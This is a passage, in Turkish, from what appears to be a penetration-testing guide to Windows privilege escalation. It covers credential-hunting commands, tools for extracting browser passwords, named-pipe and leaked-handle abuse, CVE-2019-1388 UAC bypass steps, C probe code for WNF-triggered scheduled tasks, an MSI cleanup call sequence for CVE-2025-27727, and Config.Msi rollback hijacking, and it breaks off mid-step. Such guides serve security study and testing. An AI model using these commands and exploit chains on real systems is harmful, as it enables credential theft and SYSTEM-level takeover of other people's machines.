Erişilebilir silinmiş bir `.pfx`, **code-signing** için de bir ipucu olabilir. Erişilebilir bir özel anahtar içeriyorsa bu anahtar, değiştirilmiş bir PowerShell script'ini imzalayabilir; [PowerShell, özel anahtara sahip bir code-signing sertifikası gerektirir](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature) ve [AppLocker publisher kuralları imzalayanın kimliğini ve kural kapsamını değerlendirir](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Hesaplar arası çalıştırma için mevcut kimliğin tam olarak ilgili script'i değiştirebilmesi, etkin bir kuralın script ve hedef hesap için ortaya çıkan imzayı kabul etmesi ve zamanlanmış bir görevin ya da daha yüksek ayrıcalıklı başka bir tüketicinin script'i gerçekten çalıştırması gerekir. Bir `.pfx` dosya adı, sertifika konusu veya yazılabilir bir script tek başına bu zincirin varlığını kanıtlamaz. Özel anahtar malzemesini açmadan veya görevi tetiklemeden önce meta verileri, ACL'leri, politikayı ve zamanlanmış komutu inceleyin.

Kimlik bilgilerine dair ipuçları için erişilebilir mesajlaşma istemcisi profil veritabanlarını, notları ve alınan dosyaları da inceleyin. Bir BitLocker kurtarma dışa aktarımı HTML veya TXT olarak, bazen de adı belirli bir yedek arşivinin içinde saklanabilir. Bu tür malzeme, eski yedekleri içeren ayrı bir şifreli veri birimine erişim sağlayabilir; birimi ve arşivi yalnızca erişim yetkiniz varsa inceleyin. Bir yedek `NTDS.dit` içeriyorsa, çevrimdışı etki alanı kimlik bilgisi kurtarma için [yedekleme ve ayrıcalıklı gruplar iş akışında](../active-directory-methodology/privileged-groups-and-token-privileges.md) açıklandığı gibi eşleşen `SYSTEM` hive'ı da gerekir. Dosya adları ve kilitli bir birim tek başına kullanılabilir bir kurtarma anahtarı veya etki alanı yedeği bulunduğunu kanıtlamaz.

Birkaç programın kaydettiği **parolaları kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Registry'nin içinde

**Kimlik bilgileri içerebilecek diğer registry anahtarları**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Registry'den openssh anahtarlarını çıkarma.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome veya Firefox** parolalarının saklandığı veritabanlarını kontrol etmelisiniz.\
**Chrome, Edge veya Firefox** parolalarının saklandığı veritabanlarını kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer işaretlerini ve sık kullanılanlarını da kontrol edin; buralarda bazı **parolalar saklanıyor olabilir**.

Geçerli kullanıcının standart Edge **Default** profili için `Login Data`, `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default` konumundadır; `Local State` ise üst dizin olan `User Data` içindedir. [Microsoft varsayılan profil konumunu belgeliyor](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); başka bir profil veya `UserDataDir` ilkesi bu konumu değiştirebilir. Dosyaların varlığı yalnızca kimlik bilgisi deposuna dair bir ipucudur: okunabilir dosyaları, ilgili kullanıcının DPAPI bağlamını veya izin verilen diğer anahtar materyallerini ve kaydedilmiş bir oturum açma bilgisinin daha ayrıcalıklı bir hesaba ait olup olmadığını doğrulayın. Yalnızca yolları listelemek için veritabanını açmanız veya şifresi çözülmüş parolaları yazdırmanız gerekmez.

Firefox için [Mozilla, bir profilin](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) `key4.db` ve `logins.json` dosyalarının eşleşen anahtar ve şifrelenmiş oturum açma dosyaları olduğunu belgeliyor. Bu dosyaların varlığı yalnızca bir ipucudur: her iki dosyanın da okunabilir olup olmadığını, kaydedilmiş girişlerin bulunup bulunmadığını ve kimlik bilgilerinin kullanılabilir olduğu sonucuna varmadan önce anahtarın bir Primary Password ile korunup korunmadığını kontrol edin. Kurtarılan bir kimlik bilgisi etki alanı hesabına aitse, bu hesabın etkin grup denetim haklarını ve grubun [LAPS parolasını okuma veya şifresini çözme haklarını](../active-directory-methodology/laps.md) ayrı ayrı inceleyin; tarayıcı kalıntıları tek başına yönetici erişim yolu oluşturmaz.

Tarayıcılardan parola çıkarmaya yarayan araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, Windows işletim sisteminde yerleşik, farklı dillerdeki yazılım bileşenleri arasında **iletişim** kurulmasını sağlayan bir teknolojidir. Her COM bileşeni bir **class ID (CLSID) aracılığıyla tanımlanır** ve her bileşen, interface ID'leri (IID'ler) ile tanımlanan bir veya daha fazla arayüz üzerinden işlevsellik sunar.

COM sınıfları ve arayüzleri sırasıyla **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında kayıt defterinde tanımlanır. Bu kayıt defteri, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** birleştirilerek oluşturulur.

Bu kayıt defterindeki CLSID'lerin içinde, bir **DLL** dosyasını gösteren **varsayılan değer** ile **ThreadingModel** adlı bir değer içeren alt kayıt defteri **InProcServer32** bulunur. **ThreadingModel** değeri **Apartment** (Tek İş Parçacıklı), **Free** (Çok İş Parçacıklı), **Both** (Tek veya Çok İş Parçacıklı) ya da **Neutral** (İş Parçacığından Bağımsız) olabilir.

![Tarayıcı Geçmişi - COM DLL Overwriting: Bu kayıt defterindeki CLSID'lerin içinde, bir DLL dosyasını gösteren varsayılan değer ile bir değer... içeren alt kayıt defteri InProcServer32 bulunur.](<../../images/image (729).png>)

Temel olarak, çalıştırılacak DLL'lerden herhangi birinin **üzerine yazabilirseniz**, o DLL farklı bir kullanıcı tarafından çalıştırıldığında **yetki yükseltebilirsiniz**.

Saldırganların COM Hijacking'i kalıcılık mekanizması olarak nasıl kullandığını öğrenmek için şuraya bakın:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve kayıt defterinde genel parola arama**

**Dosya içeriklerinde arama yapın**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Belirli bir dosya adıyla dosya arama**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Anahtar adlarını ve parolaları registry'de arayın**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Parolaları arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** plugin'idir. Bu plugin'i, **victim içinde credentials arayan her Metasploit POST module'ünü otomatik olarak çalıştırmak** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada bahsedilen parola içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parola çıkarmak için kullanılan başka bir harika araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) bu verileri düz metin olarak kaydeden çeşitli araçlara ait **sessions**, **usernames** ve **passwords** bilgilerini arar (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Şunu düşünün: **SYSTEM olarak çalışan bir process**, **tam erişimle** yeni bir process açıyor (`OpenProcess()`). Aynı process, **düşük ayrıcalıklarla çalışan ancak ana process'in tüm açık handle'larını devralan** yeni bir process de oluşturuyor (`CreateProcess()`).\
Ardından, **düşük ayrıcalıklı process'e tam erişiminiz varsa**, `OpenProcess()` ile oluşturulan ayrıcalıklı process'in **açık handle'ını alabilir** ve **shellcode enjekte edebilirsiniz**.\
**Bu açığın nasıl tespit edilip istismar edileceği hakkında** daha fazla bilgi için [bu örneği okuyun](leaked-handle-exploitation.md).\
Farklı izin düzeylerine sahip process ve thread'lerden devralınan açık handle'ları (yalnızca tam erişim değil) nasıl test edip kötüye kullanacağınız hakkında daha kapsamlı bir açıklama için [**bu diğer gönderiyi okuyun**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**Pipe** olarak adlandırılan paylaşılan bellek segmentleri, process iletişimini ve veri aktarımını mümkün kılar.

Windows, ilgisiz process'lerin farklı ağlar üzerinden bile veri paylaşmasını sağlayan **Named Pipes** adlı bir özellik sunar. Bu, rolleri **named pipe server** ve **named pipe client** olarak tanımlanan bir client/server mimarisine benzer.

Bir **client** pipe üzerinden veri gönderdiğinde, pipe'ı kuran **server**, gerekli **SeImpersonate** haklarına sahip olması koşuluyla **client'ın kimliğine bürünebilir**. Taklit edebileceğiniz bir pipe üzerinden iletişim kuran **ayrıcalıklı bir process** bulursanız, kurduğunuz pipe ile etkileşime geçtiğinde bu process'in kimliğine bürünerek **daha yüksek ayrıcalıklar elde edebilirsiniz**. Böyle bir saldırıyı gerçekleştirme talimatlarını [**burada**](named-pipe-client-impersonation.md) ve [**burada**](#from-high-integrity-to-system) bulabilirsiniz.

Ayrıca şu araç, **burp gibi bir araçla named pipe iletişimini yakalamanızı sağlar:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **Şu araç da privesc'leri bulmak için tüm pipe'ları listeleyip görüntülemenizi sağlar:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv uzaktan DWORD yazımıyla RCE

Server modundaki Telephony hizmeti (TapiSrv), `\\pipe\\tapsrv` (MS-TRP) öğesini kullanıma açar. Uzaktan kimliği doğrulanmış bir client, mailslot tabanlı async event yolunu kötüye kullanarak `ClientAttach` işlemini `NETWORK SERVICE` tarafından yazılabilir mevcut herhangi bir dosyaya **keyfi bir 4 baytlık yazma** işlemine dönüştürebilir. Ardından Telephony admin hakları elde edip hizmet olarak keyfi bir DLL yükleyebilir. İşlem akışının tamamı:

- `pszDomainUser` değerini yazılabilir mevcut bir yol olarak ayarlayarak `ClientAttach` çağrısı yapın → hizmet, dosyayı `CreateFileW(..., OPEN_EXISTING)` aracılığıyla açar ve async event yazımları için kullanır.
- Her event, `Initialize` içindeki saldırgan denetimindeki `InitContext` değerini bu handle'a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app kaydedin, `TRequestMakeCall` (`Req_Func 121`) çağrısını tetikleyin, `GetAsyncEvents` (`Req_Func 0`) ile alın; ardından belirleyici yazımları tekrarlamak için kaydı kaldırın/kapatın.
- `C:\Windows\TAPI\tsec.ini` dosyasındaki `[TapiAdministrators]` bölümüne kendinizi ekleyin, yeniden bağlanın ve `NETWORK SERVICE` olarak `TSPI_providerUIIdentify` çalıştırmak için keyfi bir DLL yoluyla `GetUIDllName` çağrısı yapın.

Daha fazla bilgi:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Çeşitli

### Windows'ta bir şeyler çalıştırabilen dosya uzantıları

**[https://filesec.io/](https://filesec.io/)** sayfasına göz atın.

### Markdown renderer'ları üzerinden Protocol Handler / ShellExecute kötüye kullanımı

`ShellExecuteExW`'ye iletilen tıklanabilir Markdown bağlantıları, tehlikeli URI handler'larını (`file:`, `ms-appinstaller:` veya kayıtlı herhangi bir şema) tetikleyebilir ve saldırgan denetimindeki dosyaları mevcut kullanıcı olarak çalıştırabilir. Bkz.:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Parolalar için Command Line'ları izleme**

Bir kullanıcı olarak shell aldığınızda, **kimlik bilgilerini command line üzerinden ileten** zamanlanmış görevler veya çalışan başka process'ler olabilir. Aşağıdaki script, her iki saniyede bir process command line'larını yakalar ve mevcut durumu önceki durumla karşılaştırarak farklılıkları görüntüler.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## İşlemlerden parola çalma

## Düşük ayrıcalıklı kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Grafik arayüze (konsol veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, Microsoft Windows'un bazı sürümlerinde ayrıcalıksız bir kullanıcıdan "NT\AUTHORITY SYSTEM" olarak bir terminal veya başka bir işlem çalıştırmak mümkündür.

Bu, aynı güvenlik açığıyla hem ayrıcalıkları yükseltmeyi hem de UAC'yi atlatmayı mümkün kılar. Ayrıca herhangi bir şey yüklemeniz gerekmez ve işlem sırasında kullanılan ikili dosya Microsoft tarafından imzalanmış ve yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Bu güvenlik açığından yararlanmak için aşağıdaki adımları uygulamak gerekir:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium'dan High Integrity Level'e / UAC Bypass

**Integrity Levels hakkında bilgi edinmek için** bunu okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

Ardından **UAC ve UAC bypass'ları hakkında bilgi edinmek için** bunu okuyun:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Sunulan Bir Root'a Upload Directory Junction'ları

Bir uygulama, öngörülebilir bir upload alt dizini oluşturabilir, çağıranın sağladığı dosya adını bu dizine yazabilir ve ardından dosyayı işleyebilir. Düşük ayrıcalıklı bir kullanıcı sunucu tarafındaki yazma işleminden önce bu alt dizini kaldırıp bir NTFS junction ile değiştirebiliyorsa, yazma işlemi junction'ı izleyerek web üzerinden sunulan bir dizine gidebilir. Sunucu bu dosya türünü çalıştırıyorsa buraya yerleştirilen bir script, web hizmeti kimliğiyle çalışabilir. Bu, uygulamaya özgü bir arbitrary-write sınırıdır; yazılabilir bir upload dizini veya mevcut bir junction tek başına bunu kanıtlamaz.

Upload handler'daki kesin yol oluşturma biçimini ve zamanlamayı, kullanıcının alt dizin üzerindeki etkili silme/oluşturma haklarını, hedefin etkili ACL'lerini, yazıcının reparse point'leri izleyip izlemediğini ve web sunucusunun bu hedefteki dosyaları çalıştırıp çalıştırmadığını kontrol edin. Yazıcı ve web sunucusu süreçlerinin kimliklerini ayrı ayrı doğrulayın. Pasif envanter, dizin ACL'lerini ve reparse metadata'sını gösterebilir; ancak handler'ın davranışını veya gelecekte yapılabilecek bir junction değişikliğini belirleyemez. Çalıştırma bir hizmet hesabı bağlamında gerçekleşiyorsa, ayrı bir token-privilege yolunu değerlendirmeden önce **gerçek process token'ını** inceleyin.

## WNF ile tetiklenen ayrıcalıklı scheduled-task temizliği

Elle çalıştırmayı reddeden bir scheduled task yine de ayrıcalıksız bir tetikleyiciye açık olabilir. Ayrıcalıklı bir task'ı denetlerken XML'ini dışa aktarın ve task DACL'sinin, principal'ının ve action'ının yanı sıra **tüm** tetikleyicilerini inceleyin. Özellikle, bir `WnfStateChangeTrigger` bir Windows Notification Facility (WNF) state'ini belirtir; bu securable state mevcut kullanıcının bir güncelleme yayımlamasına izin veriyorsa kullanıcı, `<AllowStartOnDemand>false</AllowStartOnDemand>` ayarına rağmen task'ı yapılandırılmış kimliğiyle dolaylı olarak başlatabilir.<sup>[[43]](#references)</sup>

Örneğin Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` task'ı SYSTEM olarak çalışıyor, standart bir kullanıcının WNF state `7508BCA32C079E41` için güncelleme göndermesini kabul ediyor ve Recall devre dışı olsa bile `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` yolunu inceliyordu.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Erişilebilirliği test etmek için `ZwUpdateWnfStateData` işlevini `ntdll.dll` üzerinden çözümleyin, sekiz baytlık durum adı için boş bir güncelleme gönderin ve dönüş durumunu görevin son çalıştırılma verileriyle veya Procmon etkinliğiyle karşılaştırın. Aşağıdaki basitleştirilmiş probe, Recall görev örneğindeki bayt dizisini kullanır; test edilen görev için dışa aktarılan baytları kullanın.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Özyinelemeli temizlemeyi ayrıcalıklı silmeye dönüştürme

Yararlı primitive yalnızca tetikleyici değil, saldırganın denetlediği bir dizini kabul eden ayrıcalıklı bir temizleme yordamıdır. İşlemi numaralandırmadan son değişikliğe kadar izleyin: profil/oturum keşfi, joker karakterle seçilen alt öğeler, `SHCreateItemFromParsingName` ve `IFileOperation::DeleteItem`, daha önce denetlenmiş bir yol adının daha sonra özyinelemeli olarak işleneceğinin güçlü göstergeleridir. Alt öğeler güvenilir dizin tanıtıcılarına göreli olarak açılıp silinmeden önce doğrulanmıyorsa saldırgan, numaralandırma ile kullanım arasında yol çözümlemesini değiştirebilir.<sup>[[43]](#references)</sup>

WNF tetikleyicisini aşağıda açıklanan [oplock, junction ve Object Manager symlink değiştirme](#from-folder-contents-delete-to-system-eop) tekniğiyle birleştirin: oplock, temizleyiciyi meşru alt öğeyi seçtikten sonra duraklatırken yazılabilir üst dizin değiştirilir; böylece ayrıcalıklı silme devam ettiğinde `\RPC Control` üzerinden korunan hedefe yönelir. Recall zincirinde bu yöntem, belgelenmiş MSI rollback tekniğinin gerektirdiği `C:\Config.Msi` dizininin SYSTEM tarafından silinmesini sağladı.<sup>[[31]](#references)[[43]](#references)</sup>

### İç içe alt öğeler, yüzeysel reparse point düzeltmelerini aşar

Yalnızca saldırganın denetlediği kökü ve onun doğrudan alt öğesini doğrulamak, yol adına dayalı özyinelemeli silmeyi güvenli hâle getirmez. Bu denetlenen nesneleri meşru tutup junction/oplock değiştirme işlemini bunların altındaki ek bir alt öğeye taşıyın; `IFileOperation::DeleteItem` eninde sonunda doğrulanmamış alt öğeye ulaşır ve onun yeni hedefine gider. CVE-2026-20941, ilk Recall yaması `UKP` ile GUID biçimindeki dizini doğrulasa da eski özyinelemeli silme işlemini koruduğundan, tam olarak bu tür eksik bir düzeltmeyle ortaya çıktı.<sup>[[43]](#references)</sup>

Güvenli yöntem, **her alt öğeyi** önceden güvenilen bir dizin tanıtıcısına göreli olarak açmak, son çözümlenen yolu/nesneyi elde edip doğrulamak ve silme disposition'ını bu doğrulanmış tanıtıcıya uygulamaktır. Bir öneki doğruladıktan sonra yol adına dayalı özyinelemeli silmeye geri dönmeyin. Yama incelemesi sırasında gerçek çağrı noktasındaki yapıları da inceleyin: bu durumda `NtCreateFile` içindeki `OBJECT_ATTRIBUTES` yapısının çalışma zamanında incelenmesi, `RootDirectory` alanının null olmadığını ve göreli `{GUID}\\secure_file.lock` adını göstererek ikinci bir `FILE_DELETE_ON_CLOSE` primitive'i olduğunu ileri süren yanıltıcı decompiler çıktısını çürüttü.<sup>[[43]](#references)</sup>

## Herhangi Bir Klasörü Silme/Taşıma/Yeniden Adlandırma ile SYSTEM EoP

Bu teknik [**bu blog gönderisinde**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) açıklanmış, exploit kodu ise [**burada**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) sunulmuştur.<sup>[[31]](#references)[[32]](#references)</sup>

Saldırı, kaldırma işlemi sırasında meşru dosyaları kötü amaçlı olanlarla değiştirmek için Windows Installer'ın rollback özelliğini kötüye kullanmaya dayanır. Bunun için saldırganın, `C:\Config.Msi` klasörünü ele geçirmek üzere kullanılacak **kötü amaçlı bir MSI installer** oluşturması gerekir. Windows Installer bu klasörü daha sonra diğer MSI paketlerini kaldırırken rollback dosyalarını depolamak için kullanır; saldırgan bu dosyaları kötü amaçlı payload içerecek şekilde değiştirmiş olur.

### Windows Installer COM temizleme yolu enjeksiyonu (CVE-2025-27727)

Düşük ayrıcalıklı bir istemci, `CMsiConfigurationManager` COM nesnesi (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) aracılığıyla SYSTEM `msiexec.exe` hizmetine erişebilir. Tersine mühendislik, ilgili `IMsiServer` çağrılarının vtable'daki `0xA0` offset'inde `MsiBeginTransactionW`, `0xC8` offset'inde `SetEEUIDirectoryAndFilter` ve `0x50` offset'inde `CleanupTempPackages` olduğunu ortaya çıkardı. Bu adlar ve offset'ler tersine mühendislikle belirlenmiştir ve derlemeler arasında değişebilir.<sup>[[41]](#references)</sup>

Yönetici olmayan bir kullanıcı için `SetEEUIDirectoryAndFilter`, yalnızca verilen yolu `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` ve `FILE_FLAG_OPEN_REPARSE_POINT` ile açarken çağıranı taklit eder. Bu, çağıranın dizini silebildiğini kanıtlar ve bir reparse point'in izlenmesini önler; ancak denetlenen dosya nesnesini sonraki temizleme işlemine bağlamaz veya dosyanın Windows Installer tarafından oluşturulduğunu kanıtlamaz.<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` çağrısından sonra `SetEEUIDirectoryAndFilter`, çağıranın filtre argümanından bağımsız olarak yolu klasör olarak sıraya alır. Hizmet, `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` altında adlandırılmış bir `REG_DWORD` değeri yazar: değer adı çağıranın denetlediği yoldur ve `0x00000002` verisi klasör bayrağıdır. Ardından `CleanupTempPackages(NULL, FALSE)` doğrudan temizlemeyi başlatır. Ayrıcalıklı çalışan, kayıt defteri değerlerini numaralandırır ve yolun kaynağını denetlemeden klasör girdilerini özyinelemeli `FDeleteFolder` işlevine iletir. Normal kaldırma başarısız olursa kod ayrıca `LockdownPath` işlevini çağırır, dosya özniteliklerini temizler ve yeniden dener.<sup>[[41]](#references)</sup>

`msi.dll` dosyasından çıkarılan asgari çağrı sırası şöyledir:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Kullanışlı primitive, junction yönlendirmesi yerine path’in yeniden kullanılmasıdır. Saldırganın oluşturduğu `C:\Config.Msi` yolunu kaydedin, silin ve Windows Installer’ın daha sonra aynı pathname’i korumalı rollback verileriyle yeniden oluşturmasını bekleyin. Cleanup, eski `TempPackages` adına güvenerek yeni dizini SYSTEM olarak siler. Reparse point gerekmediğinden bu, `FILE_FLAG_OPEN_REPARSE_POINT` ve redirection-trust mitigation ile amaçlanan sınırı aşar.<sup>[[41]](#references)</sup>

Bu silme primitive’i aşağıdaki rollback zincirine uyar: ayrı `Installer\Folders` kaydını koruyun, korumalı `C:\Config.Msi` dizinini silin, NULL DACL ile yeniden oluşturun ve installer DACL’yi sıkılaştırmadan önce `WRITE_DAC` izniyle bir handle tutun. Önceden açılmış handle, `NtSetSecurityObject` ile izin veren bir DACL’yi geri yükleyebilir; ardından rollback devam etmeden önce oluşturulan `.rbs` değiştirilebilir.<sup>[[41]](#references)</sup>

Microsoft, yeni feature gate etkin olduğunda `CMsiTransaction::SetEEUIDirectoryAndFilter` metodunun `ScheduleFileOrFolderDelete` çağırmasını engelleyerek bu yolu düzeltti. COM çağrısı yine başarı döndürebilir, ancak saldırganın kontrolündeki path’i artık `TempPackages` içine eklemez. Başarılı method dönüşünü patch testi olarak kullanmak yerine April 2025 Windows security updates güncellemelerini uygulayın.<sup>[[41]](#references)[[42]](#references)</sup>

Özetlenen teknik şöyledir:

1. **Aşama 1 – Hijack için hazırlık (`C:\Config.Msi` dizinini boş bırakın)**

- Adım 1: MSI’ı yükleyin
    - Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) yükleyen bir `.msi` oluşturun.
    - **Admin olmayan bir kullanıcının** çalıştırabilmesi için installer’ı **"UAC Compliant"** olarak işaretleyin.
    - Yükleme sonrasında dosya için bir **handle** açık tutun.

- Adım 2: Uninstall işlemini başlatın
    - Aynı `.msi` için uninstall işlemini başlatın.
    - Uninstall süreci dosyaları `C:\Config.Msi` dizinine taşımaya ve `.rbf` dosyaları (rollback yedekleri) olarak yeniden adlandırmaya başlar.
    - Dosyanın `C:\Config.Msi\<random>.rbf` haline geldiğini algılamak için açık dosya handle’ını `GetFinalPathNameByHandle` ile **poll edin**.

- Adım 3: Özel senkronizasyon
    - `.msi`, aşağıdakileri yapan bir **özel uninstall action (`SyncOnRbfWritten`)** içerir:
        - `.rbf` yazıldığında sinyal verir.
        - Ardından uninstall işlemine devam etmeden önce başka bir event’i **bekler**.

- Adım 4: `.rbf` dosyasının silinmesini engelleyin
    - Sinyal geldiğinde `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **açın** — bu, **silinmesini engeller**.
    - Ardından uninstall işleminin tamamlanabilmesi için sinyali geri gönderin.
    - Windows Installer `.rbf` dosyasını silemez ve tüm içerikleri silemediği için **`C:\Config.Msi` kaldırılmaz**.

- Adım 5: `.rbf` dosyasını elle silin
    - `.rbf` dosyasını elle silin (saldırgan olarak siz).
    - Artık **`C:\Config.Msi` boştur** ve hijack edilmeye hazırdır.

> Bu noktada, `C:\Config.Msi` dizinini silmek için **SYSTEM düzeyinde arbitrary folder delete vulnerability** tetikleyin.

2. **Aşama 2 – Rollback script’lerini kötü amaçlı olanlarla değiştirme**

- Adım 6: `C:\Config.Msi` dizinini zayıf ACL’lerle yeniden oluşturun
    - `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
    - **Zayıf DACL’ler** (ör. Everyone:F) ayarlayın ve `WRITE_DAC` izinli bir handle’ı **açık tutun**.

- Adım 7: Başka bir yükleme çalıştırın
    - `.msi` dosyasını tekrar şu değerlerle yükleyin:
        - `TARGETDIR`: Yazılabilir konum.
        - `ERROROUT`: Zorunlu bir hatayı tetikleyen değişken.
    - Bu yükleme, `.rbs` ve `.rbf` dosyalarını okuyan **rollback** işlemini yeniden tetiklemek için kullanılacaktır.

- Adım 8: `.rbs` dosyasını izleyin
    - Yeni bir `.rbs` dosyası görünene kadar `C:\Config.Msi` dizinini izlemek için `ReadDirectoryChangesW` kullanın.
    - Dosya adını kaydedin.

- Adım 9: Rollback öncesinde senkronize edin
    - `.msi`, aşağıdakileri yapan bir **özel install action (`SyncBeforeRollback`)** içerir:
        - `.rbs` oluşturulduğunda bir event sinyali gönderir.
        - Ardından devam etmeden önce **bekler**.

- Adım 10: Zayıf ACL’leri yeniden uygulayın
    - `.rbs created` event’ini aldıktan sonra:
        - Windows Installer, `C:\Config.Msi` dizinine **güçlü ACL’leri yeniden uygular**.
        - Ancak hâlâ `WRITE_DAC` izinli bir handle’ınız olduğundan, **zayıf ACL’leri yeniden uygulayabilirsiniz**.

> ACL’ler **yalnızca handle açılırken uygulanır**, dolayısıyla klasöre yazmaya devam edebilirsiniz.

- Adım 11: Sahte `.rbs` ve `.rbf` dosyalarını bırakın
    - `.rbs` dosyasını, Windows’a aşağıdakini yaptıran **sahte bir rollback script’iyle** değiştirin:
